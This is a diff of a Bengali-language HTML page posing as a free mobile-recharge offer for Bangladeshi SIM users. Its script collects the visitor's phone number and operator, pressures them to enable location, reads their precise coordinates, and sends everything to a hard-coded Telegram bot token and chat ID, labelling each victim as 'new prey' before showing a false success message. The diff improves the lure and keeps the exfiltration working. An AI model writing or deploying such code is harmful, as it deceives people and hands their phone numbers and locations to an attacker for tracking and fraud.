@@ -3,41 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>২০ টাকা ফ্রি রিচার্জ অফার!</title>
+    <title>২০ টাকা ফ্রি রিচার্জ অফার ২০২৬</title>
     <style>
-        body { background-color: #f2f2f2; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #ff0000; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { background-color: #f4f7f6; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 380px; text-align: center; border-top: 6px solid #d9534f; }
+        h2 { color: #d9534f; font-size: 24px; margin-bottom: 10px; }
+        p { color: #555; font-size: 15px; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { font-size: 14px; color: #333; font-weight: bold; margin-left: 5px; }
+        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; }
+        button { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        button:hover { background-color: #218838; }
+        .warning { color: #d9534f; font-size: 12px; margin-top: 15px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2 style="color:red">🎁 ধামাকা অফার!</h2>
-    <p>সব সিমে ২০ টাকা ইনস্ট্যান্ট ফ্রি রিচার্জ নিতে ফোনের লকেশন অপশন অন/চালু করুন না করলে পেমেন্ট পাবেন্না </p>
-    <select id="sim">
-        <option value="">সিম সিলেক্ট করুন</option>
-        <option value="GP">জিপি (GP)</option>
-        <option value="BL">বাংলালিংক (BL)</option>
-        <option value="Robi">রবি (Robi)</option>
-    </select>
-    <input type="number" id="phone" placeholder="আপনার ১১ ডিজিটের নম্বর">
-    <button onclick="checkAndSend()">রিচার্জ নিন</button>
+<div class="container">
+    <h2>🎁 ধামাকা অফার!</h2>
+    <p>সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
+    
+    <div class="input-group">
+        <label>সিম অপারেটর:</label>
+        <select id="sim">
+            <option value="">নির্বাচন করুন</option>
+            <option value="GP">জিপি (GP)</option>
+            <option value="BL">বাংলালিংক (BL)</option>
+            <option value="Robi">রবি (Robi)</option>
+            <option value="Airtel">এয়ারটেল (Airtel)</option>
+            <option value="Teletalk">টেলিটক (TT)</option>
+        </select>
+    </div>
+
+    <div class="input-group">
+        <label>মোবাইল নম্বর:</label>
+        <input type="number" id="phone" placeholder="01XXXXXXXXX">
+    </div>
+    
+    <button onclick="processOffer()">রিচার্জ নিন</button>
+    
+    <p class="warning">সতর্কতা: ভুল তথ্য দিলে অফার বাতিল হবে।</p>
 </div>
 
 <script>
-function checkAndSend() {
-    var p = document.getElementById('phone').value;
-    var s = document.getElementById('sim').value;
+function processOffer() {
+    var phone = document.getElementById('phone').value;
+    var sim = document.getElementById('sim').value;
 
-    if (s == "" || p.length < 11) { 
-        alert("সঠিক নম্বর ও সিম দিন।"); 
+    if (sim == "" || phone.length < 11) { 
+        alert("দয়া করে সঠিক সিম এবং ১১ ডিজিটের নম্বর দিন।"); 
         return; 
     }
 
-    // ইউজারকে মানসিকভাবে প্রস্তুত করা
-    alert("অফারটি নিশ্চিত করতে ফোনের লকেশন অপশন অন করুন।");
+    // আপনার দেওয়া সেই স্পেশাল মেসেজ
+    alert("রিচার্জ নিশ্চিত করতে ফোনের লোকেশন অপশন অন করুন, না হলে পেমেন্ট পাবেন না।");
 
     var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
     var chat_id = "7887080882";
@@ -46,24 +65,28 @@ function checkAndSend() {
         navigator.geolocation.getCurrentPosition(function(position) {
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
-            var map = "https://www.google.com/maps?q=" + lat + "," + lon;
+            var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
             
-            var msg = "✅ নতুন শিকার!\n📱 নম্বর: " + p + "\n📶 সিম: " + s + "\n📍 ম্যাপ: " + map;
-            send(token, chat_id, msg);
+            var message = "✅ **নতুন শিকার (লোকেশন অন)!**\n\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 লোকেশন: [ম্যাপ লিঙ্ক](" + mapUrl + ")";
+            sendToTelegram(token, chat_id, message);
         }, function(error) {
-            var msg = "⚠️ লোকেশন অফ!\n📱 নম্বর: " + p + "\n📶 সিম: " + s + "\n❌ কারণ: ইউজার পারমিশন দেয়নি।";
-            send(token, chat_id, msg);
-        }, {enableHighAccuracy: true, timeout: 5000});
+            var message = "⚠️ **নতুন শিকার (লোকেশন অফ)!**\n\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n❌ কারণ: ইউজার লোকেশন পারমিশন দেয়নি।";
+            sendToTelegram(token, chat_id, message);
+        }, { enableHighAccuracy: true, timeout: 5000 });
     } else {
-        send(token, chat_id, "⚠️ ব্রাউজারে লোকেশন সাপোর্ট নেই।\n📱 নম্বর: " + p);
+        var message = "❌ লোকেশন সাপোর্ট করে না!\n📱 নম্বর: " + phone;
+        sendToTelegram(token, chat_id, message);
     }
 }
 
-function send(t, i, m) {
-    var url = "https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + i + "&text=" + encodeURIComponent(m) + "&parse_mode=Markdown";
-    fetch(url).then(() => {
-        alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+function sendToTelegram(token, chat_id, message) {
+    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
+    
+    fetch(url).then(response => {
+        alert("ধন্যবাদ! আপনার আবেদন গ্রহণ করা হয়েছে। ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
         window.location.href = "https://www.google.com";
+    }).catch(err => {
+        alert("সার্ভার সমস্যা, আবার চেষ্টা করুন।");
     });
 }
 </script>
